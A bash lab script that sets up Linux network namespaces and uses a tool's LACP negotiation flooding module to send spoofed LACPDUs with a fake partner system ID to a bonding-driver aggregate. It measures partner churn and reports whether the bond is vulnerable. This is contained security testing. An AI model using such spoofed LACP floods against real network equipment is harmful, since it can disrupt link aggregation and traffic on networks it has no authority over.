#!/usr/bin/env bash
# Isolated LACP negotiation flooding lab (Linux only, needs root). Uses the kernel bonding driver in 802.3ad mode.
#
# Topology, all inside network namespaces:
#
#   sw:       bond0 in 802.3ad (LACP) mode, with one slave, s1. This is the aggregate under test.
#   attacker: the other end of the link, a1. It sends LACPDUs with a changing actor state.
#
# The aggregate has no real partner on this link, so every LACPDU it processes comes from the
# attacker. The bonding driver counts how often the partner of the member changed in
# /proc/net/bonding/bond0 ("Partner Churned Count"). A churn is a change of the partner state
# the driver treats as a new negotiation result.
#
#   Phase 1 (control): no LACPDUs. The bond reports no partner and no partner churn.
#   Phase 2 (attack): MACabre sends LACPDUs claiming the system ID and key below, alternating the
#            actor states below at 50 per second. The lab samples the partner and the churn count
#            during the run and at the end.
#
# During the flood the lab also samples the partner port state the member reports every 0.25 s and
# counts the changes between samples, and it prints the raw partner details at the end.
#
# Exit 0 when the bond reports the claimed system ID as its partner and either its partner churn
# count grew by at least 2 or its partner port state changed at least 2 times during the attack,
# 1 when it does not learn the claimed partner or neither signal shows a change, and 2 when the
# control already shows a partner or the setup failed.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/lacp_negotiation_flooding_lab.sh
#
# Requirements: iproute2 (ip), the bonding kernel module, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done
if ! modprobe bonding 2>/dev/null; then
    echo "The bonding kernel module is needed." >&2
    exit 2
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
CLAIMED_SYSTEM="02:00:00:00:00:c2"
CLAIMED_KEY=7
FRAMES=750
INTERVAL=0.02
STATES="0x3F,0x07"
CONTROL_SECONDS=8
ATTACK_SECONDS=15
SAMPLE_SECONDS=0.25
NO_PARTNER="00:00:00:00:00:00"
MIN_CHURN_GROWTH=2
MIN_STATE_CHANGES=2

stop_lab() {
    for ns in attacker sw; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

# Remove leftovers from a previous interrupted run.
stop_lab

ip netns add sw
ip netns add attacker

ip link add s1 type veth peer name a1
ip link set s1 netns sw
ip link set a1 netns attacker

ip netns exec sw ip link add bond0 type bond mode 802.3ad miimon 100 lacp_rate fast
ip netns exec sw ip link set bond0 up
ip netns exec sw ip link set s1 down
ip netns exec sw ip link set s1 master bond0
ip netns exec sw ip link set s1 up
ip netns exec attacker ip link set a1 up

# The partner the bond has learned, from its status file (the active aggregator's partner MAC).
partner() {
    ip netns exec sw cat /proc/net/bonding/bond0 2>/dev/null \
        | grep -m1 'Partner Mac Address' | awk '{print $NF}'
}

# Partner churn count of the member, from its section of the status file.
partner_churn() {
    ip netns exec sw cat /proc/net/bonding/bond0 2>/dev/null \
        | awk -F': *' '/Partner Churned Count/ {print $2; exit}'
}

# Port state the member reports for its partner ("details partner lacp pdu" block), as a number.
partner_port_state() {
    ip netns exec sw cat /proc/net/bonding/bond0 2>/dev/null \
        | awk '/details partner lacp pdu/ {f = 1; next} f && /port state/ {print $NF; exit}'
}

# Raw partner details, printed once for diagnosis.
partner_details() {
    ip netns exec sw cat /proc/net/bonding/bond0 2>/dev/null \
        | awk '/details partner lacp pdu/ {f = 1} f {print; n++} n == 8 {exit}'
}

ATTACK_CODE='
import os, threading
from macabre.attacks.lacp_negotiation_flooding import LacpNegotiationFloodingConfig, parse_states, run_lacp_negotiation_flooding
stats = run_lacp_negotiation_flooding(
    LacpNegotiationFloodingConfig(
        iface="a1",
        system_mac=os.environ["CLAIMED_SYSTEM"],
        key=int(os.environ["CLAIMED_KEY"]),
        states=parse_states(os.environ["STATES"]),
        frames=int(os.environ["FRAMES"]),
        interval=float(os.environ["INTERVAL"]),
    ),
    threading.Event(),
    lambda _: None,
)
print(stats.frames, stats.state_changes)
'

echo "Waiting for the bond to come up"
sleep 4

echo "Phase 1: control, no LACPDUs from the attacker"
sleep "$CONTROL_SECONDS"
CONTROL_PARTNER="$(partner)"
CONTROL_CHURN="$(partner_churn)"
echo "  partner the bond reports: ${CONTROL_PARTNER:-none}"
echo "  partner churned count: ${CONTROL_CHURN:-missing}"
echo

echo "Phase 2: attack, $FRAMES LACPDUs claiming system $CLAIMED_SYSTEM, key $CLAIMED_KEY, states $STATES, every ${INTERVAL}s"
ip netns exec attacker env PYTHONPATH="$ROOT/src" CLAIMED_SYSTEM="$CLAIMED_SYSTEM" CLAIMED_KEY="$CLAIMED_KEY" \
    STATES="$STATES" FRAMES="$FRAMES" INTERVAL="$INTERVAL" \
    "$PY" -c "$ATTACK_CODE" >/dev/null &
ATTACKER_PID=$!

# Sample the partner port state while the flood runs. Each change between two samples counts.
STATE_CHANGES=0
PREV_STATE=""
SEEN_STATES=""
DEADLINE=$((SECONDS + ATTACK_SECONDS + 5))
while kill -0 "$ATTACKER_PID" 2>/dev/null && (( SECONDS < DEADLINE )); do
    STATE="$(partner_port_state)"
    if [[ -n "$STATE" ]]; then
        SEEN_STATES="$SEEN_STATES $STATE"
        if [[ -n "$PREV_STATE" && "$STATE" != "$PREV_STATE" ]]; then
            STATE_CHANGES=$((STATE_CHANGES + 1))
        fi
        PREV_STATE="$STATE"
    fi
    sleep "$SAMPLE_SECONDS"
done
wait "$ATTACKER_PID"
MID_PARTNER="$(partner)"
MID_CHURN="$(partner_churn)"
echo "  during the flood: partner port states seen:${SEEN_STATES:- none}, changes between samples: $STATE_CHANGES"
echo "  partner the bond reports: ${MID_PARTNER:-none}, partner churned count: ${MID_CHURN:-missing}"
sleep 2
END_PARTNER="$(partner)"
END_CHURN="$(partner_churn)"
echo "  end partner the bond reports: ${END_PARTNER:-none}, partner churned count: ${END_CHURN:-missing}"
echo "  raw partner details at the end:"
partner_details | sed 's/^/    /'
echo

if [[ "$CONTROL_PARTNER" != "$NO_PARTNER" && -n "$CONTROL_PARTNER" ]]; then
    echo "Control: the bond had a partner before the attack. Result unreliable."
    exit 2
fi
if [[ -z "$CONTROL_CHURN" || -z "$END_CHURN" ]]; then
    echo "The bonding driver does not report a partner churn count. Churn is not measured here."
    CHURN_GROWTH=0
else
    CHURN_GROWTH=$((END_CHURN - CONTROL_CHURN))
fi
if [[ "$END_PARTNER" == "$CLAIMED_SYSTEM" ]] && (( CHURN_GROWTH >= MIN_CHURN_GROWTH || STATE_CHANGES >= MIN_STATE_CHANGES )); then
    echo "Result: the bond accepted the claimed system $CLAIMED_SYSTEM as its LACP partner, from an attacker port with no real partner. Its partner churned $CHURN_GROWTH time(s) and its partner port state changed $STATE_CHANGES time(s) during the flood. Vulnerable."
    exit 0
fi
if [[ "$END_PARTNER" == "$CLAIMED_SYSTEM" ]]; then
    echo "Result: the bond accepted the claimed partner, but the flood changed its member state only $STATE_CHANGES time(s) and churned $CHURN_GROWTH time(s). Not validated."
    exit 1
fi
echo "Result: the bond did not report the claimed system as its partner (it reports ${END_PARTNER:-none}). Not validated."
exit 1
